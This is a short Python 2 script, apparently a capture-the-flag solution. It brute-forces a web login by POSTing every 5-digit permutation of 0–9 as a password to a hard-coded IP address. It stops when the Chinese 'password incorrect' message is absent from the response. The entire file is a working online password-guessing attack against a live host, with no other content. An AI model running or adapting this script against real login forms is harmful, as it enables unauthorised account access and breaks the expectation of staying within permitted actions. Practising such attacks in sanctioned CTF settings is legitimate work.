#coding:utf-8
import re
import urllib
import itertools
import chardet

strpool = '1234567890'
url = 'http://120.24.86.145:8002/baopo/'
regstr = '密码不正确'
reg = re.compile(regstr)



def main():
    datas = {'pwd':'12345'}
    base = list(itertools.permutations(list(strpool),5))
    for i in base:
        datas['pwd'] = "".join(i)
        print datas['pwd']
        datat = urllib.urlencode(datas)
        text = urllib.urlopen(url,datat).read()
        if not re.findall(reg,text):
            print text
            break



if __name__ == '__main__':
    main()
